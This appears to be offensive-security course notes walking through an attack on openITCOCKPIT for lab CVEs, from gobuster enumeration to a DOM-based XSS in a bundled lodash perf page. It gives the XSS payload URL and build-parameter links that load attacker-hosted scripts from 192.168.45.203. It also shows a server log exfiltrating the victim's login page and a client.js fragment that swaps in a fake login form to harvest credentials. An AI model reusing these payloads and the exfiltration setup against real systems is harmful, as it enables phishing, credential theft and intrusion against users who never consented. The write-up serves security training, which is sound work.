# openITCOCKPIT XSS and OS Command Injection
openITCOCKPIT is an application that aids in the configuration and management of two popular monitoring utilities: Nagios and Naemon. The vendor offers both an open-source community version and an enterprise version with premium extensions.

Although the community version of openITCOCKPIT is open source, we'll take a black box approach in this module to initially exploit a cross-site scripting vulnerability. The complete exploit chain will ultimately lead to remote command execution (RCE).

These vulnerabilities were discovered by Offensive Security and are now referenced as **`CVE-2020-10788`**, **`CVE-2020-10789`**, and **`CVE-2020-10790`**.

## Application Discovery
To discover exposed endpoints, start by visiting the application's home page and noting all the endpoints it accesses. Don't overlook directories like images, CSS, or JavaScript—they may reveal valuable clues about the application's behavior, which can be useful during a black box assessment.
### Building a Sitemap
Let's visit `http://openitcockpit` in Firefox while proxying through BurpSuite to create a basic sitemap. The proxy will capture all the requests and resources that are loaded and display them in the `Target` > `Sitemap tab`.

**This initial connection reveals several things:**
- The vendor dependencies are stored in the `/lib` and `/vendor` directories.
- Application-specific JavaScript appears located in the `/js` directory.

Let's load a page that should not exist (like `/thispagedoesnotexist`) to determine the format of a `404` page.

The `404` page expands the Burp sitemap considerably. The `/js` directory is especially interesting.

Specifically, the `/js/vendor/UUID.js-4.0.3/` directory contains a `dist` subdirectory.

A successfully built JavaScript library usually outputs to a `dist` or `public` folder with minified, essential files. However, if the entire directory is included instead of just the necessary `.js` file, it may contain extra files that could increase the attack surface.

For example, the [GitHub repo](https://github.com/LiosK/UUID.js) lists a root-level `README.md` file. Let's try to open that file on our target web server by navigating to `/js/vendor/UUID.js-4.0.3/README.md`

The response indicates that README.md exists and is accessible. Although the application is misconfigured to serve more files than necessary, this is only a minor vulnerability considering our goal of remote command execution. We are, however, expanding our view of the application's internal structure.

For example, the `[/docs/](https://github.com/LiosK/UUID.js/tree/master/docs)` directory seems to contain HTML files. These "supporting" files are generally considered great targets for XSS vulnerabilities. This avenue is worth further investigation.

### Targeted Discovery
We'll begin our targeted discovery by focussing on finding aditional libraries in the `/vendor` directory. By reviewing the *Sitemap*, we already know that five libraries exist: `UUID.js-4.0.3`, `fineuploader`, `gauge`, `gridstack`, and `lodash`.

In order to discover additional libraries, we could bruteforce the vendor directory with a tool like Gobuster. However, we'll avoid common wordlist like those included with DIRB. Since we are finding JavaScript libraries in the `/js/vendor` path, we'll instead generate a more-specific wordlist using the top ten thousand npm JavaScript packages.

Conveniently for us, the [nice-registry](https://github.com/nice-registry) repo contains a curated list of all [npm packages](https://github.com/nice-registry/all-the-package-repos).

We will use `names.json`, we can use `jq` to grab only the top 10000, filter only items that have a package name with grep, strip any extra characters with cut, and redirect the output to `npm-10000.txt`.
```bash
kali@kali:~$ jq '.[0:10000]' names.json | grep ","| cut -d'"' -f 2 > npm-10000.txt
```
Using the top 10,000 npm packages, we'll search for any other packages in the `/js/vendor/` directory with `gobuster`.
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w ./npm-10000.txt -u https://openitcockpit/js/vendor/ -k 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/lodash               (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/lodash/]
/gauge                (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/gauge/]
/bootstrap-daterangepicker (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/bootstrap-daterangepicker/]
Progress: 9999 / 10000 (99.99%)
===============================================================
Finished
===============================================================
```
Gobuster identified a new package, `"bootstrap-daterangepicker"`. Unlike `UUID.js`, most vendor libraries don’t include version info in their directory names. To find the exact versions, we'll brute-force files in each library directory using Gobuster, allowing us to download the exact copies from the openITCOCKPIT server.

To accomplish this, we will first start by creating a list of URLs that contain the packages we are targeting. Later, we'll use this list as input into Gobuster in the URL flag.
```bash
kali@kali:~$ cat packages.txt 
https://openitcockpit/js/vendor/fineuploader
https://openitcockpit/js/vendor/gauge
https://openitcockpit/js/vendor/gridstack
https://openitcockpit/js/vendor/lodash
https://openitcockpit/js/vendor/UUID.js-4.0.3
https://openitcockpit/js/vendor/bootstrap-daterangepicker
```
Next, we need to find a suitable wordlist. The wordlist must include common file names like `README.md`, which might contain a version number of the library.

We'll use the [quickhits.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/quickhits.txt) list from the seclists project. The `quickhits.txt` wordlist is located in `/usr/share/seclists/Discovery/Web-Content/` on Kali.

```bash
┌──(kali㉿kali)-[~]
└─$ while read l; do echo "===$l==="; gobuster dir -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -k -q -u $l; done < packages.txt
===https://openitcockpit/js/vendor/fineuploader===
===https://openitcockpit/js/vendor/gauge===
===https://openitcockpit/js/vendor/gridstack===
/bower.json           (Status: 200) [Size: 664]
/demo                 (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/gridstack/demo/]
/dist/                (Status: 403) [Size: 162]
/README.md            (Status: 200) [Size: 22599]
===https://openitcockpit/js/vendor/lodash===
/.editorconfig        (Status: 200) [Size: 321]
/.gitattributes       (Status: 200) [Size: 12]
/.gitignore           (Status: 200) [Size: 67]
/.travis.yml          (Status: 200) [Size: 4874]
/bower.json           (Status: 200) [Size: 284]
/CONTRIBUTING.md      (Status: 200) [Size: 2402]
/package.json         (Status: 200) [Size: 586]
/README.md            (Status: 200) [Size: 1458]
/test                 (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/lodash/test/]
/test/                (Status: 403) [Size: 162]
===https://openitcockpit/js/vendor/UUID.js-4.0.3===
/.gitignore           (Status: 200) [Size: 34]
/bower.json           (Status: 200) [Size: 498]
/dist/                (Status: 403) [Size: 162]
/LICENSE.txt          (Status: 200) [Size: 11357]
/package.json         (Status: 200) [Size: 1010]
/README.md            (Status: 200) [Size: 5039]
/test                 (Status: 301) [Size: 178] [--> https://openitcockpit/js/vendor/UUID.js-4.0.3/test/]
/test/                (Status: 403) [Size: 162]
===https://openitcockpit/js/vendor/bootstrap-daterangepicker===
/README.md            (Status: 200) [Size: 2796]
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ 
```
Gobuster did not discover any directories or files for the `fineuploader` or `gauge` libraries, but it discovered a `README.md` under `gridstack`, `lodash`, `UUID.js-4.0.3`, and `bootstrap-daterangepicker`.

Before proceeding, we will remove `fineuploader` and `gauge` from `packages.txt` since we did not discover any files we could use. We'll also remove `UUID.js-4.0.3` since we are already certain the version is `4.0.3`.

```bash
kali@kali:~$ cat packages.txt 
https://openitcockpit/js/vendor/gridstack
https://openitcockpit/js/vendor/lodash
https://openitcockpit/js/vendor/bootstrap-daterangepicker
```

Next, we'll use the same while loop to run curl on each URL, appending `/README.md`.
```bash
kali@kali:~$ while read l; do echo "===$l==="; curl $l/README.md -k; done < packages.txt
===https://openitcockpit/js/vendor/gridstack===
...
- [Changes](#changes)
      - [v0.2.3 (development version)](#v023-development-version)
...
===https://openitcockpit/js/vendor/lodash===
# lodash v3.9.3
...

===https://openitcockpit/js/vendor/bootstrap-daterangepicker===
...
```
We found version numbers for `gridstack` and `lodash` but unfortunately, we could not determine version information for `bootstrap-daterangepicker`. 

Before continuing, we will concentrate on the three packages we positively identified and download each from their respective GitHub pages:
- **UUID.js:** https://github.com/LiosK/UUID.js/archive/v4.0.3.zip
- **Lodash:** https://github.com/lodash/lodash/archive/3.9.3.zip
- **Gridstack:** https://github.com/gridstack/gridstack.js/archive/v0.2.3.zip

Downloading and extracting each zip file provides us with a copy of the files that exist in the application's respective directories. This allows us to search for vulnerabilities without having to manually brute force all possible directory and file names. Not only does this save us time, it is also a quieter approach.

Since the libraries contain many files, we will first search for all `*.html` files, which are most likely to contain the XSS vulnerabilities or load JavaScript that contains XSS vulnerabilities that we are looking for.

```bash
kali@kali:~/packages$ find ./ -iname "*.html"
./lodash-3.9.3/perf/index.html
./lodash-3.9.3/vendor/firebug-lite/skin/xp/firebug.html
./lodash-3.9.3/test/underscore.html
./lodash-3.9.3/test/index.html
./lodash-3.9.3/test/backbone.html
./gridstack.js-0.2.3/demo/knockout2.html
./gridstack.js-0.2.3/demo/two.html
./gridstack.js-0.2.3/demo/nested.html
./gridstack.js-0.2.3/demo/knockout.html
./gridstack.js-0.2.3/demo/float.html
./gridstack.js-0.2.3/demo/serialization.html
./UUID.js-4.0.3/docs/uuid.js.html
./UUID.js-4.0.3/docs/UUID.html
./UUID.js-4.0.3/docs/index.html
./UUID.js-4.0.3/test/browser.html
./UUID.js-4.0.3/test/browser-core.html
```
Now that we have a list of HTML files, we can search for an XSS vulnerability to exploit. We are limited by the type of XSS vulnerability we can find though. Since these HTML files are not dynamically generated by a server, traditional reflected XSS and stored XSS won't work since user-supplied data cannot be appended to the HTML files. However, these files might contain additional JavaScript that allows user input to manipulate the DOM, which could lead to DOM-based XSS.

## XSS Hunting
We'll start our hunt for DOM-based XSS by searching for references to the `document.write`.
```bash
kali@kali:~/packages$ grep -r "document.write" ./ --include *.html
./lodash-3.9.3/perf/index.html:			document.write('<script src="' + ui.buildPath + '"><\/script>');
./lodash-3.9.3/perf/index.html:			document.write('<script src="' + ui.otherPath + '"><\/script>');
./lodash-3.9.3/perf/index.html:						document.write('<applet code="nano" archive="../vendor/benchmark.js/nano.jar"></applet>');
./lodash-3.9.3/test/underscore.html:			document.write(ui.urlParams.loader != 'none'
./lodash-3.9.3/test/index.html:				document.write('<script src="' + ui.buildPath + '"><\/script>');
./lodash-3.9.3/test/index.html:			document.write((ui.isForeign || ui.urlParams.loader == 'none')
./lodash-3.9.3/test/backbone.html:			document.write(ui.urlParams.loader != 'none'
```
The results of this search reveal four unique files that write directly to the `document`. We also find interesting keywords like `"urlParams"` in the ui object that potentially point to the use of user-provided data. Let's (randomly) inspect the `/lodash-3.9.3/perf/index.html` file.

This snippet shown is part of the `/lodash-3.9.3/perf/index.html` file.
```html
<script src="./asset/perf-ui.js"></script>
<script>
        document.write('<script src="' + ui.buildPath + '"><\/script>');
</script>
<script>
        var lodash = _.noConflict();
</script>
<script>
        document.write('<script src="' + ui.otherPath + '"><\/script>');
</script>
```
We notice the use of the `document.write` function to load a script on the web page. The source of the script is set to the `ui.otherPath` and `ui.buildPath` variable. If this variable is user-controlled, we would have access to DOM-based XSS.

Although we don't know the origin of `ui.buildPath` and `ui.otherPath`, we can search the included files for clues. Let's start by determining how `ui.buildPath` is set with `grep`. We know that JavaScript variables are set with the `"="` sign. However, we don't know if there is a space, tab, or any other delimiter between the `"buildPath"` and the `"="` sign. We can use a regex with grep to compensate for this.
```bash
kali@kali:~/packages$ grep -r "buildPath[[:space:]]*=" ./ 
./lodash-3.9.3/test/asset/test-ui.js:  ui.buildPath = (function() {
./lodash-3.9.3/perf/asset/perf-ui.js:  ui.buildPath = (function() {
```
Let's open the `perf-ui.js` file and navigate to the section where `buildPath` is set.
```bash
kali@kali:~/packages$ cat ./lodash-3.9.3/perf/asset/perf-ui.js
...
  /** The lodash build to load. */
  var build = (build = /build=([^&]+)/.exec(location.search)) && decodeURIComponent(build[1]);
...
  // The lodash build file path.
  ui.buildPath = (function() {
    var result;
    switch (build) {
      case 'lodash-compat':     result = 'lodash.compat.min.js'; break;
      case 'lodash-custom-dev': result = 'lodash.custom.js'; break;
      case 'lodash-custom':     result = 'lodash.custom.min.js'; break;
      case null:                build  = 'lodash-modern';
      case 'lodash-modern':     result = 'lodash.min.js'; break;
      default:                  return build;
    }
    return basePath + result;
  }());
...
```
The `ui.buildPath` is set near the bottom of the file. A `switch` returns the value of the build variable by default if no other condition is `true`. The build variable is set near the beginning of the file and is obtained from `location.search` (the query string) and the value of the query string is parsed using regex. The regex looks for `"build="` in the query string and extracts the value. We do not find any other sanitization of the build variable in the code. At this point, we should have a path to DOM XSS through the `"build"` query parameter!

#### Proof of Concept (PoC)
```text
https://openitcockpit/js/vendor/lodash/perf/index.html?build="></script><script>alert(1)</script>
```
#### Explanation
```
document.write('<script src="' + build + '"></script>');

// we want this
// document.write('<script src=""></script><script>alert(1)</script>');

// So build = "></script><script>alert(1)</script>
// Gives us document.write('<script src=""></script><script>alert(1)</script>"></script>');
```
## Advanced XSS Exploitation
A reflected DOM-based XSS vulnerability provides limited opportunities. Let's discuss what we can and can't do at this point.

First, we will need a victim to exploit. Unlike stored XSS, which can exploit anyone who visits the page, we will have to craft a specific link to send to a victim. Once the victim visits the page, the XSS will be triggered.

**Summary of Reflected DOM-based XSS Exploit Strategy:**

This document outlines a strategy for exploiting a **reflected DOM-based XSS vulnerability**, which requires crafting and delivering a malicious link to a **specific victim** (unlike stored XSS which affects all visitors). Key points include:

1. **Session Cookie Access is Restricted**:
   The session cookie (`itnovum`) has the `HttpOnly` flag, preventing direct access via JavaScript. Therefore, stealing cookies isn’t feasible.

2. **Alternative Exploitation via the DOM and Same-Origin Policy (SOP)**:
   Although JavaScript can't read the session cookie, it can still **load and access authenticated content** from the same origin via `XHR` or `fetch`, since the browser sends the session cookie with those requests. This allows scraping authenticated pages if the victim is logged in.

3. **Attack Strategy**:

   * Use XSS to inject a script into a legitimate page.
   * The script loads and scrapes authenticated content from the same origin.
   * Collected data is **exfiltrated to an attacker-controlled server**.

4. **Implementation Plan**:

   * Build a custom tool (instead of using frameworks like BeEF), including:

     * **XSS Payload Script**: Injected into the victim's session.
     * **Flask API Server**: Receives and stores scraped data.
     * **SQLite Database**: Stores data for future use.
   * Ensure the **XSS page looks legitimate** to keep the victim engaged.
   * Include a script to **rebuild remote HTML locally** from the scraped data.
   * Write reusable and modular code for extensibility.

**Goal**: Extract and reconstruct authenticated content by leveraging an XSS payload within the boundaries of browser security policies.
### Writing to DOM
Using the document interface, we can query for HTML elements via the `getElementByID` and `getElementsByTagName` methods. We can change the content of an HTML element with the `innerHTML` property. We can also create new elements with `createElement` method.

For example, we can query for all `"body"` elements using:
```javascript
>> document.getElementsByTagName("body")[0]
<- <body>
```
We can save the reference to the object by prepending the command with:
```javascript
>> body = document.getElementsByTagName("body")[0]
<- <body>
```
Next, we can get the contents of `body` by accessing the `innerHTML` property.
```javascript
>> body.innerHTML
<- "
    <div id=\"perf-toolbar\"><span style=\"float: right;\">
    ...
    </script>
  "
```
We can also overwrite the HTML in body by setting `innerHTML` equal to a string of valid HTML.
```javascript
>> body.innerHTML = "<h1>Magic!</h1>"
<- "<h1>Magic!</h1>"
```
Using this method, we can control every aspect of the user experience. Later, we will expand on these concepts and use XHR requests to retrieve content in a way the victim won't notice.
### XSS Hijack Credentials
Normally, we would use a properly-issued certificate and purchase a domain to host the API server, but for the purposes of this module, a self-signed certificate will suffice. A key and certificate can be generated using the `openssl` command.
```bash
kali@kali:~/scripts$ openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365
Generating a RSA private key
...................................................................................................++++
.............................++++
writing new private key to 'key.pem'
-----
```
Running the API with `sudo python3 api.py` should start the listener on port `80`.
```bash
┌──(venv)─(kali㉿kali)-[~]
└─$ python3 api.py --host 192.168.45.203 --port 80 --cert cert.pem --key key.pem 
Serving HTTPS on 192.168.45.203 port 80 (http://192.168.45.203:80/) ...
 * Serving Flask app 'api'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on https://192.168.45.203:80
Press CTRL+C to quit

```

#### Building the `client.js`
To make a fake login page samilar to the original one, we will use [stealLoginPageContnet.js](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/stealLoginPageContnet.js):
```text
https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.45.203:80/stealLoginPageContnet.js
```
Then check our server:
```bash
┌──(venv)─(kali㉿kali)-[~]
└─$ python3 api.py --host 192.168.45.203 --port 80 --cert cert.pem --key key.pem 
Serving HTTPS on 192.168.45.203 port 80 (http://192.168.45.203:80/) ...
 * Serving Flask app 'api'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on https://192.168.45.203:80
Press CTRL+C to quit
[+] Sending Payload
192.168.45.203 - - [02/Aug/2025 09:58:56] "GET /stealLoginPageContnet.js HTTP/1.1" 200 -
192.168.45.203 - - [02/Aug/2025 09:58:56] "GET /steal?data=<!DOCTYPE%20html>%0A<html%20lang%3D"en">%0A<head>%0A%20%20%20%20<!--[if%20IE]>%0A%20%20%20%20<meta%20http-equiv%3D"X-UA-Compatible"%20content%3D"IE%3Dedge,chrome%3D1">%0A%20%20%20%20<![endif]-->%0A%20%20%20%20<meta%20http-equiv%3D"Content-Type"%20content%3D"text/html;%20charset%3Dutf-8"%20/>%20%20%20%20<meta%20name%3D"viewport"%20content%3D"width%3Ddevice-width,%20initial-scale%3D1">%0A%20%20%20%20<title>%0A%20%20%20%20%20%20%20%20Login%20-%20open%20source%20system%20monitoring%20%20%20%20</title>%0A%20%20%20%20<link%20href%3D"/favicon.ico?v3.7.2"%20type%3D"image/x-icon"%20rel%3D"icon"/><link%20href%3D"/favicon.ico?v3.7.2"%20type%3D"image/x-icon"%20rel%3D"shortcut%20icon"/>%20%20%20%20<link%20rel%3D"stylesheet"%20type%3D"text/css"%0A%20%20%20%20%20%20%20%20%20%20href%3D"/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2"/>%0A%20%20%20%20<link%20rel%3D"stylesheet"%20type%3D"text/css"%0A%20%20%20%20%20%20%20%20%20%20href%3D"/smartadmin/css/font-awesome.min.css?v3.7.2"/>%0A%20%20%20%20<link%20rel%3D"stylesheet"%20type%3D"text/css"%20href%3D"/css/login.css?1754143135"/>%0A%0A%20%20%20%20<script%20type%3D"text/javascript"%0A%20%20%20%20%20%20%20%20%20%20%20%20src%3D"/frontend/js/lib/jquery.min.js?v3.7.2"></script>%0A%20%20%20%20<script%20type%3D"text/javascript"%20src%3D"/js/lib/particles.min.js?v3.7.2"></script>%0A%20%20%20%20<script%20type%3D"text/javascript"%20src%3D"/js/login.js?1754143135"></script>%0A%0A%0A</head>%0A<body%20class%3D"main">%0A%0A%0A%20%20%20%20<div%20class%3D"login-screen">%0A%20%20%20%20%20%20%20%20<figure>%0A%20%20%20%20%20%20%20%20%20%20%20%20<figcaption>Photo%20by%20SpaceX%20on%20Unsplash</figcaption>%0A%20%20%20%20%20%20%20%20</figure>%0A%20%20%20%20%20%20%20%20<figure>%0A%20%20%20%20%20%20%20%20%20%20%20%20<figcaption>Photo%20by%20NASA%20on%20Unsplash</figcaption>%0A%20%20%20%20%20%20%20%20</figure>%0A%20%20%20%20</div>%0A<div%20class%3D"container-fluid">%0A%20%20%20%20<div%20class%3D"row">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20id%3D"particles-js"%20class%3D"col-xs-12%20col-sm-6%20col-md-7%20col-lg-9"></div>%0A%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A</div>%0A%0A<div%20class%3D"login-center">%0A%20%20%20%20<div%20class%3D"min-height%20container-fluid">%0A%20%20%20%20%20%20%20%20<div%20class%3D"row">%0A%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"col-xs-12%20col-sm-6%20col-md-5%20col-lg-3%20col-sm-offset-6%20col-md-offset-7%20col-lg-offset-9">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"login"%20id%3D"card">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"login-alert">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"login-header">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<h1>openITCOCKPIT</h1>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<h4>Open%20source%20system%20monitoring</h4>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"login-form-div">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"front%20signin_form">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<p>Login</p>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<form%20action%3D"/login/login"%20novalidate%3D"novalidate"%20id%3D"login-form"%20class%3D"login-form"%20method%3D"post"%20accept-charset%3D"utf-8"><div%20style%3D"display:none;"><input%20type%3D"hidden"%20name%3D"_method"%20value%3D"POST"/></div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"form-group">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"input-group">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<input%20name%3D"data[LoginUser][username]"%20class%3D"form-control"%20placeholder%3D"Type%20your%20email%20or%20username"%20inputDefaults%3D"%20%20"%20type%3D"text"%20id%3D"LoginUserUsername"/>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span%20class%3D"input-group-addon">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<i%20class%3D"fa%20fa-lg%20fa-user"></i>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</span>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"form-group">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"input-group">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<input%20name%3D"data[LoginUser][password]"%20class%3D"form-control"%20placeholder%3D"Type%20your%20password"%20inputDefaults%3D"%20%20"%20type%3D"password"%20id%3D"LoginUserPassword"/>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<span%20class%3D"input-group-addon">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<i%20class%3D"fa%20fa-lg%20fa-lock"></i>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</span>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"checkbox">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"checkbox"><input%20type%3D"hidden"%20name%3D"data[LoginUser][remember_me]"%20id%3D"LoginUserRememberMe_"%20value%3D"0"/><label%20for%3D"LoginUserRememberMe"><input%20type%3D"checkbox"%20name%3D"data[LoginUser][remember_me]"%20class%3D""%20value%3D"1"%20id%3D"LoginUserRememberMe"/>%20Remember%20me%20on%20this%20computer</label></div>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"form-group%20sign-btn">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit"%20class%3D"btn%20btn-primary%20pull-right">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Sign%20in%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</button>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</form>%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20</div>%0A</div>%0A%0A%0A<div%20class%3D"footer">%0A%20%20%20%20<div%20class%3D"container-fluid">%0A%20%20%20%20%20%20%20%20<div%20class%3D"row%20pull-right">%0A%20%20%20%20%20%20%20%20%20%20%20%20<div%20class%3D"col-xs-12">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<a%20href%3D"https://openitcockpit.io/"%20target%3D"_blank"%20class%3D"btn%20btn-default">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<i%20class%3D"fa%20fa-lg%20fa-globe"></i>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</a>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<a%20href%3D"https://github.com/it-novum/openITCOCKPIT"%20target%3D"_blank"%20class%3D"btn%20btn-default">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<i%20class%3D"fa%20fa-lg%20fa-github"></i>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</a>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<a%20href%3D"https://twitter.com/openITCOCKPIT"%20target%3D"_blank"%20class%3D"btn%20btn-default">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20<i%20class%3D"fa%20fa-lg%20fa-twitter"></i>%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</a>%0A%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20</div>%0A</div>%0A%0A%0A%0A<div%20class%3D"container">%0A%20%20%20%20<div%20class%3D"row">%0A%20%20%20%20%20%20%20%20<div%20class%3D"col-xs-12">%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20</div>%0A%20%20%20%20</div>%0A</div>%0A</body>%0A</html>%0A HTTP/1.1" 404 -                                                                                                            

```
Next we will URL decode the content received, and put it into our [client.js](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/client.js) file, in the `loginhtml` variable:
```html
loginhtml = 
`<!DOCTYPE html>
<html lang="en">
<head>
    <!--[if IE]>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <![endif]-->
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>
        Login - open source system monitoring    </title>
    <link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="icon"/><link href="/favicon.ico?v3.7.2" type="image/x-icon" rel="shortcut icon"/>    <link rel="stylesheet" type="text/css"
...
                    </div>
    </div>
</div>
</body>
</html>`;
document.getElementsByTagName("html")[0].innerHTML = loginhtml;
var attacker = '192.168.45.203' // CHANGE ME
...
```

Note: place [api.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/api.py), [stealLoginPageContnet.js](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/stealLoginPageContnet.js), [db.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/db.py) and [client.js](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openITCOCKPIT/client.js) in the same directory.

As a victim, visit:
```text
https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.45.203:80/client.js
```
Check your server:
```bash
┌──(venv)─(kali㉿kali)-[~]
└─$ python3 api.py --host 192.168.45.203 --port 80 --cert cert.pem --key key.pem 
Serving HTTPS on 192.168.45.203 port 80 (http://192.168.45.203:80/) ...
 * Serving Flask app 'api'
 * Debug mode: off
